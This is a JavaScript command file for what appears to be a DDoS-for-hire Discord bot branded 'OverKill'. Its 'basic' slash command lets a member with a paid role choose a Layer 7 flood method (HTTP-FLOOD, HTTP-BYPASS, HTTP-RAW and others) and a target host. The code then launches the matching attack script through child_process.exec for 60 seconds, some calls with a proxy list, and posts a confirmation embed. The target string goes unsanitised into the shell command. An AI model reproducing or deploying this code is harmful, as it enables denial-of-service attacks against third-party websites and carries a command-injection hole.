const { MessageEmbed } = require('discord.js');
const ayarlar = require('../../ayarlar.json');
var version = ayarlar['versionbot'];
var roleID6 = ayarlar['roleID6'];
var commandroom = ayarlar['commandroom'];
var img = ayarlar['img'];
var photovip4 = ayarlar['photovip4'];
var randomgif = photovip4[Math['floor']((Math['random']() * photovip4['length']))];
module['exports'] = {
    name: 'basic',
    description: 'Attack Web ( Layer7 )',
    type: 'CHAT_INPUT',
    cooldown: 60,
    options: [{
        name: 'methods',
        description: 'Attack methods',
        required: true,
        type: 'STRING',
        choices: [{
            name: `${'HTTP-BASIC'}`,
            value: `${'HTTP-BASIC'}`,
            inline: true
        }, {
            name: `${'HTTP-BYPASS'}`,
            value: `${'HTTP-BYPASS'}`,
            inline: true
        },{
            name: `${'HTTP-FLOOD'}`,
            value: `${'HTTP-FLOOD'}`,
            inline: true
        }, {
            name: `${'HTTP-LOAD'}`,
            value: `${'HTTP-LOAD'}`,
            inline: true
        }, {
            name: `${'HTTP-MAX'}`,
            value: `${'HTTP-MAX'}`,
            inline: true
        }, {
            name: `${'HTTP-RAND'}`,
            value: `${'HTTP-RAND'}`,
            inline: true
        }, {
            name: `${'HTTP-RAW'}`,
            value: `${'HTTP-RAW'}`,
            inline: true
        }, {
            name: `${'HTTP-SOCKET'}`,
            value: `${'HTTP-SOCKET'}`,
            inline: true
        }, {
            name: `${'RAW-BASIC'}`,
            value: `${'RAW-BASIC'}`,
            inline: true 
        }]
    }, {
        name: 'host',
        description: 'Attack Host',
        required: true,
        type: 'STRING'
    }],
    run: async(_0xf396x7, _0xf396x8) => {
        if (!_0xf396x8['member']['roles']['cache']['has'](roleID6)) {
            return _0xf396x8['reply']({
                embeds: [new MessageEmbed()['setColor']('RANDOM')['setDescription'](`${'Ch\u1EC9 c\xF3 <@&'}${roleID6}${'> m\u1EDBi \u0111\u01B0\u1EE3c d\xF9ng l\u1EC7nh n\xE0y.'}`)['setFooter']({
                    text: '\xA9 OverKill'
                })['setTimestamp']()]
            })
        };
        const pathNode = require('path').join(require('path').dirname(require('which').sync('node')), 'node');
        const _0xf396x9 = _0xf396x8['options']['getString']('methods');
        const website = _0xf396x8['options']['getString']('host');
            if (_0xf396x9 === 'HTTP-BASIC') {
            var method = _0xf396x9;
            const { exec } = require('child_process');
            exec(`cd basic && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60 50'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
                value: `${' [ '}${_0xf396x8['user']['username']}${' ] '}`,
                inline: true
            }, {
                name: '**`🔗 Host:`**',
                value: `${' [ '}${website}${' ] '}`,
                inline: true
            }, {
                name: '**`\uD83D\uDCA5 Method:`**',
                value: `${' [ '}${_0xf396x9}${' ] '}`,
                inline: true
            }, {
                name: '**`🕒 Time:`**',
                value: `${' [ 60 Second ] '}`,
                inline: true
            }, {
                name: '**`🔰 Mode:`**',
                value: `${' [ Layer7 ] '}`,
                inline: true
            }, {
                name: '**`💸 Plan:`**',
                value: `${' [ BASIC ] '}`,
                inline: true
            })['setImage'](randomgif)
['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
        if (_0xf396x9 === 'HTTP-BYPASS') {
            var method = _0xf396x9;
            const { exec } = require('child_process');
            exec(`cd basic && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
                value: `${' [ '}${_0xf396x8['user']['username']}${' ] '}`,
                inline: true
            }, {
                name: '**`🔗 Host:`**',
                value: `${' [ '}${website}${' ] '}`,
                inline: true
            }, {
                name: '**`\uD83D\uDCA5 Method:`**',
                value: `${' [ '}${_0xf396x9}${' ] '}`,
                inline: true
            }, {
                name: '**`🕒 Time:`**',
                value: `${' [ 60 Second ] '}`,
                inline: true
            }, {
                name: '**`🔰 Mode:`**',
                value: `${' [ Layer7 ] '}`,
                inline: true
            }, {
                name: '**`💸 Plan:`**',
                value: `${' [ BASIC ] '}`,
                inline: true
            })['setImage'](randomgif)
['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }if (_0xf396x9 === 'HTTP-FLOOD') {
            var method = _0xf396x9;
            const { exec } = require('child_process');
            exec(`cd basic && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
                value: `${' [ '}${_0xf396x8['user']['username']}${' ] '}`,
                inline: true
            }, {
                name: '**`🔗 Host:`**',
                value: `${' [ '}${website}${' ] '}`,
                inline: true
            }, {
                name: '**`\uD83D\uDCA5 Method:`**',
                value: `${' [ '}${_0xf396x9}${' ] '}`,
                inline: true
            }, {
                name: '**`🕒 Time:`**',
                value: `${' [ 60 Second ] '}`,
                inline: true
            }, {
                name: '**`🔰 Mode:`**',
                value: `${' [ Layer7 ] '}`,
                inline: true
            }, {
                name: '**`💸 Plan:`**',
                value: `${' [ BASIC ] '}`,
                inline: true
            })['setImage'](randomgif)
['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
            if (_0xf396x9 === 'HTTP-LOAD') {
            var method = _0xf396x9;
            const { exec } = require('child_process');
            exec(`cd basic && cd L7 && ${pathNode} ${method}${'.js '}${website}${'  60 http.txt 50'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
                value: `${' [ '}${_0xf396x8['user']['username']}${' ] '}`,
                inline: true
            }, {
                name: '**`🔗 Host:`**',
                value: `${' [ '}${website}${' ] '}`,
                inline: true
            }, {
                name: '**`\uD83D\uDCA5 Method:`**',
                value: `${' [ '}${_0xf396x9}${' ] '}`,
                inline: true
            }, {
                name: '**`🕒 Time:`**',
                value: `${' [ 60 Second ] '}`,
                inline: true
            }, {
                name: '**`🔰 Mode:`**',
                value: `${' [ Layer7 ] '}`,
                inline: true
            }, {
                name: '**`💸 Plan:`**',
                value: `${' [ BASIC ] '}`,
                inline: true
            })['setImage'](randomgif)
['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
            if (_0xf396x9 === 'HTTP-MAX') {
            var method = _0xf396x9;
            const { exec } = require('child_process');
            exec(`cd basic && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60 50 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
                value: `${' [ '}${_0xf396x8['user']['username']}${' ] '}`,
                inline: true
            }, {
                name: '**`🔗 Host:`**',
                value: `${' [ '}${website}${' ] '}`,
                inline: true
            }, {
                name: '**`\uD83D\uDCA5 Method:`**',
                value: `${' [ '}${_0xf396x9}${' ] '}`,
                inline: true
            }, {
                name: '**`🕒 Time:`**',
                value: `${' [ 60 Second ] '}`,
                inline: true
            }, {
                name: '**`🔰 Mode:`**',
                value: `${' [ Layer7 ] '}`,
                inline: true
            }, {
                name: '**`💸 Plan:`**',
                value: `${' [ BASIC ] '}`,
                inline: true
            })['setImage'](randomgif)
['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
            if (_0xf396x9 === 'HTTP-RAND') {
            var method = _0xf396x9;
            const { exec } = require('child_process');
            exec(`cd basic && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
                value: `${' [ '}${_0xf396x8['user']['username']}${' ] '}`,
                inline: true
            }, {
                name: '**`🔗 Host:`**',
                value: `${' [ '}${website}${' ] '}`,
                inline: true
            }, {
                name: '**`\uD83D\uDCA5 Method:`**',
                value: `${' [ '}${_0xf396x9}${' ] '}`,
                inline: true
            }, {
                name: '**`🕒 Time:`**',
                value: `${' [ 60 Second ] '}`,
                inline: true
            }, {
                name: '**`🔰 Mode:`**',
                value: `${' [ Layer7 ] '}`,
                inline: true
            }, {
                name: '**`💸 Plan:`**',
                value: `${' [ BASIC ] '}`,
                inline: true
            })['setImage'](randomgif)
['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
            if (_0xf396x9 === 'HTTP-RAW') {
            var method = _0xf396x9;
            const { exec } = require('child_process');
            exec(`cd basic && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
                value: `${' [ '}${_0xf396x8['user']['username']}${' ] '}`,
                inline: true
            }, {
                name: '**`🔗 Host:`**',
                value: `${' [ '}${website}${' ] '}`,
                inline: true
            }, {
                name: '**`\uD83D\uDCA5 Method:`**',
                value: `${' [ '}${_0xf396x9}${' ] '}`,
                inline: true
            }, {
                name: '**`🕒 Time:`**',
                value: `${' [ 60 Second ] '}`,
                inline: true
            }, {
                name: '**`🔰 Mode:`**',
                value: `${' [ Layer7 ] '}`,
                inline: true
            }, {
                name: '**`💸 Plan:`**',
                value: `${' [ BASIC ] '}`,
                inline: true
            })['setImage'](randomgif)
              ['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
            if (_0xf396x9 === 'HTTP-SOCKET') {
            var method = _0xf396x9;
            const { exec } = require('child_process');
            exec(`cd basic && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 30 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
                value: `${' [ '}${_0xf396x8['user']['username']}${' ] '}`,
                inline: true
            }, {
                name: '**`🔗 Host:`**',
                value: `${' [ '}${website}${' ] '}`,
                inline: true
            }, {
                name: '**`\uD83D\uDCA5 Method:`**',
                value: `${' [ '}${_0xf396x9}${' ] '}`,
                inline: true
            }, {
                name: '**`🕒 Time:`**',
                value: `${' [ 60 Second ] '}`,
                inline: true
            }, {
                name: '**`🔰 Mode:`**',
                value: `${' [ Layer7 ] '}`,
                inline: true
            }, {
                name: '**`💸 Plan:`**',
                value: `${' [ BASIC ] '}`,
                inline: true
            })['setImage'](randomgif)
['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
        if (_0xf396x9 === 'RAW-BASIC') {
            var method = _0xf396x9;
            const { exec } = require('child_process');
            exec(`${'cd basic && cd L7 && node '}${method}${'.js '}${website}${' 60 RAW 50'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
            console['log']('A attack run ID Discord:' + _0xf396x8['guild']['id']);
            const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB User:`**',
                value: `${' [ '}${_0xf396x8['user']['username']}${' ] '}`,
                inline: true
            }, {
                name: '**`🔗 Host:`**',
                value: `${' [ '}${website}${' ] '}`,
                inline: true
            }, {
                name: '**`\uD83D\uDCA5 Method:`**',
                value: `${' [ '}${_0xf396x9}${' ] '}`,
                inline: true
            }, {
                name: '**`🕒 Time:`**',
                value: `${' [ 60 Second ] '}`,
                inline: true
            }, {
                name: '**`🔰 Mode:`**',
                value: `${' [ Layer7 ] '}`,
                inline: true
            }, {
                name: '**`💸 Plan:`**',
                value: `${' [ BASIC ] '}`,
                inline: true
            })['setImage'](randomgif)
['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
['setTimestamp']();
            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']({ text: '\xA9 Developer: OverKill', iconURL: img })
['setTimestamp']();
            _0xf396x8['reply']({
                embeds: [_0xf396x11]
            })['then']((_0xf396x12) => {
                setTimeout(function () {
                    _0xf396x8['editReply']({
                        embeds: [_0xf396x10]
                    })
                }, 3000)
            })
        }
    }
}
